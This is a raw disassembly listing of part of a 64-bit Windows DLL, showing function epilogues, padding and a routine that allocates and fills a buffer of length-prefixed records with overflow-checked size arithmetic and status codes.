   180003a69:	c7 05 8d e3 03 00 02 	movl   $0x2,0x3e38d(%rip)        # 0x180041e00
   180003a70:	00 00 00 
   180003a73:	48 ff 15 ae 73 03 00 	rex.W call *0x373ae(%rip)        # 0x18003ae28
   180003a7a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003a7f:	8b cb                	mov    %ebx,%ecx
   180003a81:	e8 16 e9 ff ff       	call   0x18000239c
   180003a86:	8b cb                	mov    %ebx,%ecx
   180003a88:	e8 5b a3 01 00       	call   0x18001dde8
   180003a8d:	48 8b ce             	mov    %rsi,%rcx
   180003a90:	48 ff 15 b1 73 03 00 	rex.W call *0x373b1(%rip)        # 0x18003ae48
   180003a97:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003a9c:	48 8b ce             	mov    %rsi,%rcx
   180003a9f:	c7 05 57 e3 03 00 03 	movl   $0x3,0x3e357(%rip)        # 0x180041e00
   180003aa6:	00 00 00 
   180003aa9:	48 ff 15 78 73 03 00 	rex.W call *0x37378(%rip)        # 0x18003ae28
   180003ab0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003ab5:	48 8b 0d ec e3 03 00 	mov    0x3e3ec(%rip),%rcx        # 0x180041ea8
   180003abc:	e8 6b c5 00 00       	call   0x18001002c
   180003ac1:	48 8b ce             	mov    %rsi,%rcx
   180003ac4:	48 ff 15 7d 73 03 00 	rex.W call *0x3737d(%rip)        # 0x18003ae48
   180003acb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003ad0:	48 8b ce             	mov    %rsi,%rcx
   180003ad3:	c7 05 23 e3 03 00 04 	movl   $0x4,0x3e323(%rip)        # 0x180041e00
   180003ada:	00 00 00 
   180003add:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003ae2:	48 83 c4 20          	add    $0x20,%rsp
   180003ae6:	5e                   	pop    %rsi
   180003ae7:	48 ff 25 3a 73 03 00 	rex.W jmp *0x3733a(%rip)        # 0x18003ae28
   180003aee:	cc                   	int3
   180003aef:	cc                   	int3
   180003af0:	cc                   	int3
   180003af1:	cc                   	int3
   180003af2:	cc                   	int3
   180003af3:	cc                   	int3
   180003af4:	cc                   	int3
   180003af5:	cc                   	int3
   180003af6:	cc                   	int3
   180003af7:	cc                   	int3
   180003af8:	cc                   	int3
   180003af9:	cc                   	int3
   180003afa:	cc                   	int3
   180003afb:	cc                   	int3
   180003afc:	cc                   	int3
   180003afd:	cc                   	int3
   180003afe:	cc                   	int3
   180003aff:	cc                   	int3
   180003b00:	48 8b c4             	mov    %rsp,%rax
   180003b03:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180003b07:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180003b0b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   180003b0f:	55                   	push   %rbp
   180003b10:	41 54                	push   %r12
   180003b12:	41 55                	push   %r13
   180003b14:	41 56                	push   %r14
   180003b16:	41 57                	push   %r15
   180003b18:	48 8d a8 d8 f9 ff ff 	lea    -0x628(%rax),%rbp
   180003b1f:	48 81 ec 00 07 00 00 	sub    $0x700,%rsp
   180003b26:	48 8b 05 db c5 03 00 	mov    0x3c5db(%rip),%rax        # 0x180040108
   180003b2d:	48 33 c4             	xor    %rsp,%rax
   180003b30:	48 89 85 f0 05 00 00 	mov    %rax,0x5f0(%rbp)
   180003b37:	33 c0                	xor    %eax,%eax
   180003b39:	48 8d 0d 20 e3 03 00 	lea    0x3e320(%rip),%rcx        # 0x180041e60
   180003b40:	89 45 40             	mov    %eax,0x40(%rbp)
   180003b43:	8b f8                	mov    %eax,%edi
   180003b45:	89 45 fc             	mov    %eax,-0x4(%rbp)
   180003b48:	48 ff 15 f9 72 03 00 	rex.W call *0x372f9(%rip)        # 0x18003ae48
   180003b4f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003b54:	33 c0                	xor    %eax,%eax
   180003b56:	48 8d 15 43 fa ff ff 	lea    -0x5bd(%rip),%rdx        # 0x1800035a0
   180003b5d:	45 33 c0             	xor    %r8d,%r8d
   180003b60:	89 05 22 e3 03 00    	mov    %eax,0x3e322(%rip)        # 0x180041e88
   180003b66:	48 8d 0d 37 79 03 00 	lea    0x37937(%rip),%rcx        # 0x18003b4a4
   180003b6d:	89 05 19 e3 03 00    	mov    %eax,0x3e319(%rip)        # 0x180041e8c
   180003b73:	89 05 17 e3 03 00    	mov    %eax,0x3e317(%rip)        # 0x180041e90
   180003b79:	89 05 15 e3 03 00    	mov    %eax,0x3e315(%rip)        # 0x180041e94
   180003b7f:	48 ff 15 ea 70 03 00 	rex.W call *0x370ea(%rip)        # 0x18003ac70
   180003b86:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003b8b:	45 33 f6             	xor    %r14d,%r14d
   180003b8e:	48 89 05 b3 e2 03 00 	mov    %rax,0x3e2b3(%rip)        # 0x180041e48
   180003b95:	48 85 c0             	test   %rax,%rax
   180003b98:	75 27                	jne    0x180003bc1
   180003b9a:	48 ff 15 af 6d 03 00 	rex.W call *0x36daf(%rip)        # 0x18003a950
   180003ba1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003ba6:	48 8d 0d b3 e2 03 00 	lea    0x3e2b3(%rip),%rcx        # 0x180041e60
   180003bad:	44 8b e0             	mov    %eax,%r12d
   180003bb0:	48 ff 15 71 72 03 00 	rex.W call *0x37271(%rip)        # 0x18003ae28
   180003bb7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003bbc:	e9 6a 98 00 00       	jmp    0x18000d42b
   180003bc1:	48 8d 0d 98 e2 03 00 	lea    0x3e298(%rip),%rcx        # 0x180041e60
   180003bc8:	48 ff 15 59 72 03 00 	rex.W call *0x37259(%rip)        # 0x18003ae28
   180003bcf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003bd4:	33 d2                	xor    %edx,%edx
   180003bd6:	8d 4a 02             	lea    0x2(%rdx),%ecx
   180003bd9:	44 8d 4a 0a          	lea    0xa(%rdx),%r9d
   180003bdd:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   180003be1:	e8 26 f8 ff ff       	call   0x18000340c
   180003be6:	44 8b e0             	mov    %eax,%r12d
   180003be9:	85 c0                	test   %eax,%eax
   180003beb:	0f 85 3a 98 00 00    	jne    0x18000d42b
   180003bf1:	48 8b 0d a0 e2 03 00 	mov    0x3e2a0(%rip),%rcx        # 0x180041e98
   180003bf8:	48 ff 15 c1 6f 03 00 	rex.W call *0x36fc1(%rip)        # 0x18003abc0
   180003bff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003c04:	e8 d7 d3 00 00       	call   0x180010fe0
   180003c09:	33 c0                	xor    %eax,%eax
   180003c0b:	48 89 85 f0 01 00 00 	mov    %rax,0x1f0(%rbp)
   180003c12:	89 45 e8             	mov    %eax,-0x18(%rbp)
   180003c15:	89 85 ac 00 00 00    	mov    %eax,0xac(%rbp)
   180003c1b:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180003c22:	89 45 5c             	mov    %eax,0x5c(%rbp)
   180003c25:	8d 50 04             	lea    0x4(%rax),%edx
   180003c28:	89 85 b0 00 00 00    	mov    %eax,0xb0(%rbp)
   180003c2e:	8d 48 40             	lea    0x40(%rax),%ecx
   180003c31:	48 ff 15 88 6d 03 00 	rex.W call *0x36d88(%rip)        # 0x18003a9c0
   180003c38:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003c3d:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   180003c44:	48 89 85 b0 05 00 00 	mov    %rax,0x5b0(%rbp)
   180003c4b:	48 8b f0             	mov    %rax,%rsi
   180003c4e:	e8 71 38 03 00       	call   0x1800374c4
   180003c53:	83 4d 00 ff          	orl    $0xffffffff,0x0(%rbp)
   180003c57:	48 8d 0d a2 c5 03 00 	lea    0x3c5a2(%rip),%rcx        # 0x180040200
   180003c5e:	41 bd 7a 00 07 80    	mov    $0x8007007a,%r13d
   180003c64:	33 c0                	xor    %eax,%eax
   180003c66:	41 bc 08 00 00 00    	mov    $0x8,%r12d
   180003c6c:	41 be 17 00 00 c0    	mov    $0xc0000017,%r14d
   180003c72:	48 bb 58 4a b5 b1 17 	movabs $0xc81ecb17b1b54a58,%rbx
   180003c79:	cb 1e c8 
   180003c7c:	48 bf 5e 60 69 ab 7f 	movabs $0x7f1137fab69605e,%rdi
   180003c83:	13 f1 07 
   180003c86:	45 8d 7d 94          	lea    -0x6c(%r13),%r15d
   180003c8a:	48 85 f6             	test   %rsi,%rsi
   180003c8d:	75 0f                	jne    0x180003c9e
   180003c8f:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180003c96:	45 8b f7             	mov    %r15d,%r14d
   180003c99:	e9 3a 4b 00 00       	jmp    0x1800087d8
   180003c9e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003ca1:	48 89 b5 88 00 00 00 	mov    %rsi,0x88(%rbp)
   180003ca8:	0f 11 45 18          	movups %xmm0,0x18(%rbp)
   180003cac:	48 89 85 c0 05 00 00 	mov    %rax,0x5c0(%rbp)
   180003cb3:	48 89 85 d0 05 00 00 	mov    %rax,0x5d0(%rbp)
   180003cba:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180003cbf:	89 85 b4 00 00 00    	mov    %eax,0xb4(%rbp)
   180003cc5:	89 45 38             	mov    %eax,0x38(%rbp)
   180003cc8:	48 89 8d 20 03 00 00 	mov    %rcx,0x320(%rbp)
   180003ccf:	48 ff 15 da 6c 03 00 	rex.W call *0x36cda(%rip)        # 0x18003a9b0
   180003cd6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003cdb:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   180003ce1:	41 8b d4             	mov    %r12d,%edx
   180003ce4:	48 8b c8             	mov    %rax,%rcx
   180003ce7:	48 ff 15 ba 6c 03 00 	rex.W call *0x36cba(%rip)        # 0x18003a9a8
   180003cee:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003cf3:	45 33 db             	xor    %r11d,%r11d
   180003cf6:	4c 8b e8             	mov    %rax,%r13
   180003cf9:	48 85 c0             	test   %rax,%rax
   180003cfc:	0f 84 b3 27 00 00    	je     0x1800064b5
   180003d02:	48 8b 85 20 03 00 00 	mov    0x320(%rbp),%rax
   180003d09:	ba 80 00 00 00       	mov    $0x80,%edx
   180003d0e:	4c 89 ad c0 05 00 00 	mov    %r13,0x5c0(%rbp)
   180003d15:	0f 10 00             	movups (%rax),%xmm0
   180003d18:	41 0f 11 45 00       	movups %xmm0,0x0(%r13)
   180003d1d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180003d21:	41 0f 11 4d 10       	movups %xmm1,0x10(%r13)
   180003d26:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180003d2a:	41 0f 11 45 20       	movups %xmm0,0x20(%r13)
   180003d2f:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180003d33:	41 0f 11 4d 30       	movups %xmm1,0x30(%r13)
   180003d38:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180003d3c:	41 0f 11 45 40       	movups %xmm0,0x40(%r13)
   180003d41:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180003d45:	41 0f 11 4d 50       	movups %xmm1,0x50(%r13)
   180003d4a:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180003d4e:	41 0f 11 45 60       	movups %xmm0,0x60(%r13)
   180003d53:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180003d57:	41 0f 11 4c 15 f0    	movups %xmm1,-0x10(%r13,%rdx,1)
   180003d5d:	0f 10 04 10          	movups (%rax,%rdx,1),%xmm0
   180003d61:	41 0f 11 44 15 00    	movups %xmm0,0x0(%r13,%rdx,1)
   180003d67:	0f 10 4c 10 10       	movups 0x10(%rax,%rdx,1),%xmm1
   180003d6c:	41 0f 11 4c 15 10    	movups %xmm1,0x10(%r13,%rdx,1)
   180003d72:	48 8d 05 cf c3 03 00 	lea    0x3c3cf(%rip),%rax        # 0x180040148
   180003d79:	48 89 85 28 03 00 00 	mov    %rax,0x328(%rbp)
   180003d80:	48 ff 15 29 6c 03 00 	rex.W call *0x36c29(%rip)        # 0x18003a9b0
   180003d87:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003d8c:	4d 8b c4             	mov    %r12,%r8
   180003d8f:	41 8b d4             	mov    %r12d,%edx
   180003d92:	48 8b c8             	mov    %rax,%rcx
   180003d95:	48 ff 15 0c 6c 03 00 	rex.W call *0x36c0c(%rip)        # 0x18003a9a8
   180003d9c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003da1:	45 33 db             	xor    %r11d,%r11d
   180003da4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003da9:	48 8b d0             	mov    %rax,%rdx
   180003dac:	48 85 c0             	test   %rax,%rax
   180003daf:	0f 84 00 27 00 00    	je     0x1800064b5
   180003db5:	48 8b 85 28 03 00 00 	mov    0x328(%rbp),%rax
   180003dbc:	48 89 95 d0 05 00 00 	mov    %rdx,0x5d0(%rbp)
   180003dc3:	48 8b 08             	mov    (%rax),%rcx
   180003dc6:	48 89 0a             	mov    %rcx,(%rdx)
   180003dc9:	0f 31                	rdtsc
   180003dcb:	48 c1 e2 20          	shl    $0x20,%rdx
   180003dcf:	48 0b c2             	or     %rdx,%rax
   180003dd2:	48 89 85 e0 01 00 00 	mov    %rax,0x1e0(%rbp)
   180003dd9:	c7 45 44 0c 00 00 00 	movl   $0xc,0x44(%rbp)
   180003de0:	4c 8d 85 20 02 00 00 	lea    0x220(%rbp),%r8
   180003de7:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
   180003dec:	48 8d 0d bd 76 03 00 	lea    0x376bd(%rip),%rcx        # 0x18003b4b0
   180003df3:	e8 fc 36 03 00       	call   0x1800374f4
   180003df8:	45 33 db             	xor    %r11d,%r11d
   180003dfb:	85 c0                	test   %eax,%eax
   180003dfd:	79 12                	jns    0x180003e11
   180003dff:	4c 89 9d 20 02 00 00 	mov    %r11,0x220(%rbp)
   180003e06:	41 be 3e 00 00 c0    	mov    $0xc000003e,%r14d
   180003e0c:	e9 a4 26 00 00       	jmp    0x1800064b5
   180003e11:	48 8b 85 20 02 00 00 	mov    0x220(%rbp),%rax
   180003e18:	41 b9 95 00 00 c0    	mov    $0xc0000095,%r9d
   180003e1e:	48 ff c0             	inc    %rax
   180003e21:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   180003e28:	8d 04 45 04 00 00 00 	lea    0x4(,%rax,2),%eax
   180003e2f:	83 f8 04             	cmp    $0x4,%eax
   180003e32:	72 08                	jb     0x180003e3c
   180003e34:	45 8b f3             	mov    %r11d,%r14d
   180003e37:	89 45 44             	mov    %eax,0x44(%rbp)
   180003e3a:	eb 06                	jmp    0x180003e42
   180003e3c:	8b 45 44             	mov    0x44(%rbp),%eax
   180003e3f:	45 8b f1             	mov    %r9d,%r14d
   180003e42:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180003e47:	45 85 f6             	test   %r14d,%r14d
   180003e4a:	0f 88 6a 26 00 00    	js     0x1800064ba
   180003e50:	05 c4 00 00 00       	add    $0xc4,%eax
   180003e55:	41 83 c8 ff          	or     $0xffffffff,%r8d
   180003e59:	b9 c4 00 00 00       	mov    $0xc4,%ecx
   180003e5e:	41 8b d0             	mov    %r8d,%edx
   180003e61:	3b c1                	cmp    %ecx,%eax
   180003e63:	41 ba 00 00 00 10    	mov    $0x10000000,%r10d
   180003e69:	0f 43 d0             	cmovae %eax,%edx
   180003e6c:	45 1b f6             	sbb    %r14d,%r14d
   180003e6f:	45 23 f1             	and    %r9d,%r14d
   180003e72:	45 03 f2             	add    %r10d,%r14d
   180003e75:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180003e7a:	3b c1                	cmp    %ecx,%eax
   180003e7c:	0f 82 25 26 00 00    	jb     0x1800064a7
   180003e82:	8d 42 08             	lea    0x8(%rdx),%eax
   180003e85:	41 8b c8             	mov    %r8d,%ecx
   180003e88:	3b c2                	cmp    %edx,%eax
   180003e8a:	0f 43 c8             	cmovae %eax,%ecx
   180003e8d:	45 1b f6             	sbb    %r14d,%r14d
   180003e90:	45 23 f1             	and    %r9d,%r14d
   180003e93:	45 03 f2             	add    %r10d,%r14d
   180003e96:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180003e9b:	3b c2                	cmp    %edx,%eax
   180003e9d:	0f 82 04 26 00 00    	jb     0x1800064a7
   180003ea3:	44 89 65 44          	mov    %r12d,0x44(%rbp)
   180003ea7:	8d 41 08             	lea    0x8(%rcx),%eax
   180003eaa:	41 8b d0             	mov    %r8d,%edx
   180003ead:	3b c1                	cmp    %ecx,%eax
   180003eaf:	0f 43 d0             	cmovae %eax,%edx
   180003eb2:	45 1b f6             	sbb    %r14d,%r14d
   180003eb5:	45 23 f1             	and    %r9d,%r14d
   180003eb8:	45 03 f2             	add    %r10d,%r14d
   180003ebb:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180003ec0:	3b c1                	cmp    %ecx,%eax
   180003ec2:	0f 82 df 25 00 00    	jb     0x1800064a7
   180003ec8:	89 54 24 64          	mov    %edx,0x64(%rsp)
   180003ecc:	8b f2                	mov    %edx,%esi
   180003ece:	48 ff 15 db 6a 03 00 	rex.W call *0x36adb(%rip)        # 0x18003a9b0
   180003ed5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003eda:	44 8b c6             	mov    %esi,%r8d
   180003edd:	41 8b d4             	mov    %r12d,%edx
   180003ee0:	48 8b c8             	mov    %rax,%rcx
   180003ee3:	48 ff 15 be 6a 03 00 	rex.W call *0x36abe(%rip)        # 0x18003a9a8
   180003eea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003eef:	45 33 db             	xor    %r11d,%r11d
   180003ef2:	48 8b d0             	mov    %rax,%rdx
   180003ef5:	48 85 c0             	test   %rax,%rax
   180003ef8:	75 0b                	jne    0x180003f05
   180003efa:	41 be 17 00 00 c0    	mov    $0xc0000017,%r14d
   180003f00:	e9 b0 25 00 00       	jmp    0x1800064b5
   180003f05:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   180003f0a:	44 89 5c 24 60       	mov    %r11d,0x60(%rsp)
   180003f0f:	44 89 9d 28 01 00 00 	mov    %r11d,0x128(%rbp)
   180003f16:	4c 8d 40 04          	lea    0x4(%rax),%r8
   180003f1a:	4c 3b c2             	cmp    %rdx,%r8
   180003f1d:	0f 82 63 28 00 00    	jb     0x180006786
   180003f23:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   180003f27:	49 03 c4             	add    %r12,%rax
   180003f2a:	48 03 ca             	add    %rdx,%rcx
   180003f2d:	48 3b c1             	cmp    %rcx,%rax
   180003f30:	76 0b                	jbe    0x180003f3d
   180003f32:	41 be 23 00 00 c0    	mov    $0xc0000023,%r14d
   180003f38:	e9 78 25 00 00       	jmp    0x1800064b5
   180003f3d:	be 04 00 00 00       	mov    $0x4,%esi
   180003f42:	89 32                	mov    %esi,(%rdx)
   180003f44:	8b 85 28 01 00 00    	mov    0x128(%rbp),%eax
   180003f4a:	41 89 00             	mov    %eax,(%r8)
   180003f4d:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   180003f51:	ff c1                	inc    %ecx
   180003f53:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   180003f57:	4c 39 5c 24 68       	cmp    %r11,0x68(%rsp)
   180003f5c:	75 2b                	jne    0x180003f89
   180003f5e:	c7 85 30 01 00 00 a4 	movl   $0xa4,0x130(%rbp)
   180003f65:	00 00 00 
   180003f68:	8b 44 24 64          	mov    0x64(%rsp),%eax
   180003f6c:	8d 90 a4 00 00 00    	lea    0xa4(%rax),%edx
   180003f72:	3b d0                	cmp    %eax,%edx
   180003f74:	0f 82 0c 28 00 00    	jb     0x180006786
   180003f7a:	ff c1                	inc    %ecx
   180003f7c:	89 54 24 64          	mov    %edx,0x64(%rsp)
   180003f80:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   180003f84:	e9 e5 00 00 00       	jmp    0x18000406e
   180003f89:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   180003f8e:	41 8b d3             	mov    %r11d,%edx
   180003f91:	85 c9                	test   %ecx,%ecx
   180003f93:	74 2b                	je     0x180003fc0
   180003f95:	41 8b 00             	mov    (%r8),%eax
   180003f98:	03 c6                	add    %esi,%eax
   180003f9a:	3b c6                	cmp    %esi,%eax
   180003f9c:	0f 82 ff 00 00 00    	jb     0x1800040a1
   180003fa2:	89 85 30 01 00 00    	mov    %eax,0x130(%rbp)
   180003fa8:	44 8b c8             	mov    %eax,%r9d
   180003fab:	4d 03 c8             	add    %r8,%r9
   180003fae:	4d 3b c8             	cmp    %r8,%r9
   180003fb1:	0f 82 cf 27 00 00    	jb     0x180006786
   180003fb7:	ff c2                	inc    %edx
   180003fb9:	4d 8b c1             	mov    %r9,%r8
   180003fbc:	3b d1                	cmp    %ecx,%edx
   180003fbe:	72 d5                	jb     0x180003f95
   180003fc0:	49 8d 50 04          	lea    0x4(%r8),%rdx
   180003fc4:	49 3b d0             	cmp    %r8,%rdx
   180003fc7:	0f 82 b9 27 00 00    	jb     0x180006786
   180003fcd:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   180003fd1:	49 8d 80 a4 00 00 00 	lea    0xa4(%r8),%rax
   180003fd8:	48 03 4c 24 68       	add    0x68(%rsp),%rcx
   180003fdd:	45 8b f3             	mov    %r11d,%r14d
   180003fe0:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   180003fe5:	48 3b c1             	cmp    %rcx,%rax
   180003fe8:	0f 87 44 ff ff ff    	ja     0x180003f32
   180003fee:	41 c7 00 a0 00 00 00 	movl   $0xa0,(%r8)
   180003ff5:	b8 80 00 00 00       	mov    $0x80,%eax
   180003ffa:	41 0f 10 45 00       	movups 0x0(%r13),%xmm0
   180003fff:	0f 11 02             	movups %xmm0,(%rdx)
   180004002:	41 0f 10 4d 10       	movups 0x10(%r13),%xmm1
   180004007:	0f 11 4a 10          	movups %xmm1,0x10(%rdx)
   18000400b:	41 0f 10 45 20       	movups 0x20(%r13),%xmm0
   180004010:	0f 11 42 20          	movups %xmm0,0x20(%rdx)
   180004014:	41 0f 10 4d 30       	movups 0x30(%r13),%xmm1
   180004019:	0f 11 4a 30          	movups %xmm1,0x30(%rdx)
   18000401d:	41 0f 10 45 40       	movups 0x40(%r13),%xmm0
   180004022:	0f 11 42 40          	movups %xmm0,0x40(%rdx)
   180004026:	41 0f 10 4d 50       	movups 0x50(%r13),%xmm1
   18000402b:	0f 11 4a 50          	movups %xmm1,0x50(%rdx)
   18000402f:	41 0f 10 45 60       	movups 0x60(%r13),%xmm0
   180004034:	0f 11 42 60          	movups %xmm0,0x60(%rdx)
   180004038:	41 0f 10 4d 70       	movups 0x70(%r13),%xmm1
   18000403d:	0f 11 4c 02 f0       	movups %xmm1,-0x10(%rdx,%rax,1)
   180004042:	41 0f 10 44 05 00    	movups 0x0(%r13,%rax,1),%xmm0
   180004048:	0f 11 04 02          	movups %xmm0,(%rdx,%rax,1)
   18000404c:	41 0f 10 4c 05 10    	movups 0x10(%r13,%rax,1),%xmm1
   180004052:	0f 11 4c 02 10       	movups %xmm1,0x10(%rdx,%rax,1)
   180004057:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   18000405b:	ff c1                	inc    %ecx
   18000405d:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   180004061:	45 85 f6             	test   %r14d,%r14d
   180004064:	0f 88 50 24 00 00    	js     0x1800064ba
   18000406a:	8b 54 24 64          	mov    0x64(%rsp),%edx
   18000406e:	4c 39 5c 24 68       	cmp    %r11,0x68(%rsp)
   180004073:	75 39                	jne    0x1800040ae
   180004075:	c7 85 34 01 00 00 0c 	movl   $0xc,0x134(%rbp)
   18000407c:	00 00 00 
   18000407f:	8d 42 0c             	lea    0xc(%rdx),%eax
   180004082:	3b c2                	cmp    %edx,%eax
   180004084:	0f 82 fc 26 00 00    	jb     0x180006786
   18000408a:	8b d0                	mov    %eax,%edx
   18000408c:	ff c1                	inc    %ecx
   18000408e:	48 8b 85 e0 01 00 00 	mov    0x1e0(%rbp),%rax
   180004095:	48 89 85 48 02 00 00 	mov    %rax,0x248(%rbp)
   18000409c:	e9 af 00 00 00       	jmp    0x180004150
   1800040a1:	41 be 95 00 00 c0    	mov    $0xc0000095,%r14d
   1800040a7:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1800040ac:	eb b3                	jmp    0x180004061
   1800040ae:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1800040b3:	45 8b cb             	mov    %r11d,%r9d
   1800040b6:	85 c9                	test   %ecx,%ecx
   1800040b8:	74 2d                	je     0x1800040e7
   1800040ba:	41 8b 00             	mov    (%r8),%eax
   1800040bd:	03 c6                	add    %esi,%eax
   1800040bf:	3b c6                	cmp    %esi,%eax
   1800040c1:	0f 82 ad 00 00 00    	jb     0x180004174
   1800040c7:	89 85 34 01 00 00    	mov    %eax,0x134(%rbp)
   1800040cd:	44 8b d0             	mov    %eax,%r10d
   1800040d0:	4d 03 d0             	add    %r8,%r10
   1800040d3:	4d 3b d0             	cmp    %r8,%r10
   1800040d6:	0f 82 aa 26 00 00    	jb     0x180006786
   1800040dc:	41 ff c1             	inc    %r9d
   1800040df:	4d 8b c2             	mov    %r10,%r8
   1800040e2:	44 3b c9             	cmp    %ecx,%r9d
   1800040e5:	72 d3                	jb     0x1800040ba
   1800040e7:	4d 8d 48 04          	lea    0x4(%r8),%r9
   1800040eb:	4d 3b c8             	cmp    %r8,%r9
   1800040ee:	0f 82 92 26 00 00    	jb     0x180006786
   1800040f4:	8b ca                	mov    %edx,%ecx
   1800040f6:	49 8d 40 0c          	lea    0xc(%r8),%rax
   1800040fa:	48 03 4c 24 68       	add    0x68(%rsp),%rcx
   1800040ff:	45 8b f3             	mov    %r11d,%r14d
   180004102:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   180004107:	48 3b c1             	cmp    %rcx,%rax
   18000410a:	0f 87 22 fe ff ff    	ja     0x180003f32
   180004110:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180004115:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   18000411b:	45 89 20             	mov    %r12d,(%r8)
   18000411e:	48 8b 00             	mov    (%rax),%rax
   180004121:	49 89 01             	mov    %rax,(%r9)
   180004124:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   180004128:	8b 54 24 64          	mov    0x64(%rsp),%edx
   18000412c:	ff c1                	inc    %ecx
   18000412e:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   180004132:	45 85 f6             	test   %r14d,%r14d
   180004135:	0f 88 7f 23 00 00    	js     0x1800064ba
   18000413b:	48 8b 85 e0 01 00 00 	mov    0x1e0(%rbp),%rax
   180004142:	48 89 85 48 02 00 00 	mov    %rax,0x248(%rbp)
   180004149:	4c 39 5c 24 68       	cmp    %r11,0x68(%rsp)
   18000414e:	75 34                	jne    0x180004184
   180004150:	c7 85 38 01 00 00 0c 	movl   $0xc,0x138(%rbp)
   180004157:	00 00 00 
   18000415a:	8d 42 0c             	lea    0xc(%rdx),%eax
   18000415d:	3b c2                	cmp    %edx,%eax
   18000415f:	0f 82 21 26 00 00    	jb     0x180006786
   180004165:	ff c1                	inc    %ecx
   180004167:	89 44 24 64          	mov    %eax,0x64(%rsp)
   18000416b:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   18000416f:	e9 8c 00 00 00       	jmp    0x180004200
   180004174:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   18000417a:	45 8b f5             	mov    %r13d,%r14d
   18000417d:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   180004182:	eb ae                	jmp    0x180004132
   180004184:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   180004189:	45 8b cb             	mov    %r11d,%r9d
   18000418c:	85 c9                	test   %ecx,%ecx
   18000418e:	74 2d                	je     0x1800041bd
   180004190:	41 8b 00             	mov    (%r8),%eax
   180004193:	03 c6                	add    %esi,%eax
   180004195:	3b c6                	cmp    %esi,%eax
   180004197:	0f 82 8e 00 00 00    	jb     0x18000422b
   18000419d:	89 85 38 01 00 00    	mov    %eax,0x138(%rbp)
   1800041a3:	44 8b d0             	mov    %eax,%r10d
   1800041a6:	4d 03 d0             	add    %r8,%r10
   1800041a9:	4d 3b d0             	cmp    %r8,%r10
   1800041ac:	0f 82 bf 25 00 00    	jb     0x180006771
   1800041b2:	41 ff c1             	inc    %r9d
   1800041b5:	4d 8b c2             	mov    %r10,%r8
   1800041b8:	44 3b c9             	cmp    %ecx,%r9d
   1800041bb:	72 d3                	jb     0x180004190
   1800041bd:	4d 8d 48 04          	lea    0x4(%r8),%r9
   1800041c1:	4d 3b c8             	cmp    %r8,%r9
   1800041c4:	0f 82 a7 25 00 00    	jb     0x180006771
   1800041ca:	8b ca                	mov    %edx,%ecx
   1800041cc:	49 8d 40 0c          	lea    0xc(%r8),%rax
   1800041d0:	48 03 4c 24 68       	add    0x68(%rsp),%rcx
   1800041d5:	45 8b f3             	mov    %r11d,%r14d
   1800041d8:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   1800041dd:	48 3b c1             	cmp    %rcx,%rax
   1800041e0:	0f 87 4c fd ff ff    	ja     0x180003f32
   1800041e6:	45 89 20             	mov    %r12d,(%r8)
